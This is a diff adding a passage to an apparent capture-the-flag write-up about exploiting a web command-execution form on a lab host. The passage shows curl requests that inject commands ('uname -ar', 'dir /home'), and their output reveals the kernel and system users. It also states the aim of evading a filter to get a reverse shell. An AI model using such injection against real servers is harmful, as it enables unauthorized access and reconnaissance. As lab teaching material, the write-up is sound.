@@ -179,5 +179,56 @@ This time we got no luck, we are facing some "string filtering" as stated before
 Since our goal is to get a reverse shell, we must find a way to evade that protection.
 
 
+Meanwhile, we can also use curl to explore some other command:
+
+
+```
+# curl -X POST http://10.10.94.161/secret/index.php -d 'command=uname -ar'
+<html>
+<body>
+
+<form method="POST">
+        <input id="comm" type="text" name="command" placeholder="Command">
+        <button>Execute</button>
+</form>
+<h2 style="color:blue;">Linux ubuntu 4.15.0-118-generic #119-Ubuntu SMP Tue Sep 8 12:30:01 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+</h2>
+                        <style>
+                             body
+                             {
+                                   background-image: url('images/blue_boy_typing_nothought.gif');
+                                   background-position: center center;
+                                   background-repeat: no-repeat;
+                                   background-attachment: fixed;
+                                   background-size: cover;
+}
+                          </style>
+        </body>
+</html>
+```
+
+Let's obtain a more clean results:
+
+
+```
+# curl -s -X POST http://10.10.94.161/secret/index.php -d 'command=uname -ar' |grep color | awk -F '>' '{ print $2 }'
+Linux ubuntu 4.15.0-118-generic #119-Ubuntu SMP Tue Sep 8 12:30:01 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+```
+
+We found 3 potential system users with "dir" command (we know that "ls" is avoided):
+
+
+```
+# curl -s -X POST http://10.10.94.161/secret/index.php -d 'command=dir /home' |grep color | awk -F '>' '{ print $2 }'
+anurodh  apaar  aurick
+```
+
+
+
+
+
+
+
+
 
 
